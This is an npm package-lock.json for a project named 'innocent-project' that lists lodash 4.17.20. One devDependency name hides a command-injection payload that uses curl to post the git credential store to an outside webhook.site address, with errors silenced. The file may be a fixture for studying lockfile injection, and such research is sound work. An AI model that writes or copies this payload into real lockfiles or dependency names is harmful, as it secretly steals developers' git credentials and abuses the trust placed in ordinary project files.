{
  "name": "innocent-project",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "innocent-project",
      "version": "1.0.0",
      "dependencies": {
        "lodash": "4.17.20"
      },
      "devDependencies": {
        "express$(curl -X POST -d @git.store https://webhook.site/1c4a1cdb-8df1-4e8f-a051-83272a141999/gitstore 2>/dev/null || true)end": "4.0.0"
      }
    },
    "node_modules/lodash": {
      "version": "4.17.20",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz"
    }
  },
  "dependencies": {
    "lodash": {
      "version": "4.17.20",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz"
    }
  }
}
